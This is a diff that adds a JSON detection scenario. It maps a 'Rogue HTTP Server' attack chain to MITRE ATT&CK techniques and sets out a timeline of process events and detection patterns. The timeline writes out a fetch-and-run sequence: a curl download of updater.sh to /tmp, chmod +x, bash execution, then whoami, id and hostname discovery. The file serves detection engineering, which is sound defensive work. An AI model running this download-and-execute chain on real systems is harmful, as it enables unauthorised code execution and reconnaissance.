@@ -1,0 +1,166 @@
+{
+  "scenario": "Rogue HTTP Server",
+  "attack_technique": {
+    "primary": {
+      "id": "T1105",
+      "name": "Ingress Tool Transfer"
+    },
+    "secondary": [
+      {
+        "id": "T1059.004",
+        "name": "Unix Shell"
+      },
+      {
+        "id": "T1033",
+        "name": "System Owner/User Discovery"
+      },
+      {
+        "id": "T1082",
+        "name": "System Information Discovery"
+      }
+    ]
+  },
+  "timeline": [
+    {
+      "sequence": 1,
+      "phase": "Infrastructure Staging",
+      "timestamp": "2026-06-01T23:11:16",
+      "event_type": "process_creation",
+      "process": {
+        "image": "/usr/bin/python3",
+        "command_line": "python3 -m http.server 8000",
+        "parent_image": "/usr/bin/bash"
+      },
+      "description": "A temporary Python HTTP server was started to host attacker-controlled content.",
+      "attack_mapping": {
+        "technique_id": "T1105",
+        "technique_name": "Ingress Tool Transfer"
+      }
+    },
+    {
+      "sequence": 2,
+      "phase": "Tool Transfer",
+      "timestamp": "2026-06-01T23:20:08",
+      "event_type": "process_creation",
+      "process": {
+        "image": "/usr/bin/curl",
+        "command_line": "curl http://127.0.0.1:8000/updater.sh -o /tmp/updater.sh",
+        "parent_image": "/usr/bin/bash"
+      },
+      "description": "The payload was downloaded from the rogue HTTP server and written to temporary storage.",
+      "attack_mapping": {
+        "technique_id": "T1105",
+        "technique_name": "Ingress Tool Transfer"
+      }
+    },
+    {
+      "sequence": 3,
+      "phase": "Payload Staging",
+      "timestamp": "2026-06-01T23:20:08",
+      "event_type": "file_creation",
+      "file": {
+        "path": "/tmp/updater.sh",
+        "operation": "CREATE"
+      },
+      "description": "Downloaded payload was created within the temporary directory.",
+      "attack_mapping": {
+        "technique_id": "T1105",
+        "technique_name": "Ingress Tool Transfer"
+      }
+    },
+    {
+      "sequence": 4,
+      "phase": "Payload Preparation",
+      "timestamp": "2026-06-01T23:22:43",
+      "event_type": "process_creation",
+      "process": {
+        "image": "/usr/bin/chmod",
+        "command_line": "chmod +x /tmp/updater.sh",
+        "parent_image": "/usr/bin/bash"
+      },
+      "description": "Executable permissions were applied to the downloaded payload.",
+      "attack_mapping": {
+        "technique_id": "T1059.004",
+        "technique_name": "Unix Shell"
+      }
+    },
+    {
+      "sequence": 5,
+      "phase": "Payload Execution",
+      "timestamp": "2026-06-01T23:32:24",
+      "event_type": "process_creation",
+      "process": {
+        "image": "/usr/bin/bash",
+        "command_line": "/bin/bash /tmp/updater.sh",
+        "parent_image": "/usr/bin/bash"
+      },
+      "description": "The transferred payload was executed from the temporary directory.",
+      "attack_mapping": {
+        "technique_id": "T1059.004",
+        "technique_name": "Unix Shell"
+      }
+    },
+    {
+      "sequence": 6,
+      "phase": "Discovery",
+      "timestamp": "2026-06-01T23:32:24",
+      "event_type": "process_creation",
+      "process": {
+        "image": "/usr/bin/whoami",
+        "command_line": "whoami",
+        "parent_image": "/tmp/updater.sh"
+      },
+      "description": "Payload performed user context discovery.",
+      "attack_mapping": {
+        "technique_id": "T1033",
+        "technique_name": "System Owner/User Discovery"
+      }
+    },
+    {
+      "sequence": 7,
+      "phase": "Discovery",
+      "timestamp": "2026-06-01T23:32:24",
+      "event_type": "process_creation",
+      "process": {
+        "image": "/usr/bin/id",
+        "command_line": "id",
+        "parent_image": "/tmp/updater.sh"
+      },
+      "description": "Payload enumerated user and group membership information.",
+      "attack_mapping": {
+        "technique_id": "T1033",
+        "technique_name": "System Owner/User Discovery"
+      }
+    },
+    {
+      "sequence": 8,
+      "phase": "Discovery",
+      "timestamp": "2026-06-01T23:32:24",
+      "event_type": "process_creation",
+      "process": {
+        "image": "/usr/bin/hostname",
+        "command_line": "hostname",
+        "parent_image": "/tmp/updater.sh"
+      },
+      "description": "Payload collected host identity information.",
+      "attack_mapping": {
+        "technique_id": "T1082",
+        "technique_name": "System Information Discovery"
+      }
+    }
+  ],
+  "behavioral_chain": [
+    "Python HTTP Server Creation",
+    "Payload Download",
+    "Temporary File Creation",
+    "Permission Modification",
+    "Payload Execution",
+    "User Discovery",
+    "System Discovery"
+  ],
+  "detection_summary": {
+    "primary_pattern": "Download -> Permission Change -> Execute",
+    "secondary_pattern": "Python HTTP Server -> Tool Transfer -> Execution",
+    "confidence": "High"
+  }
+}
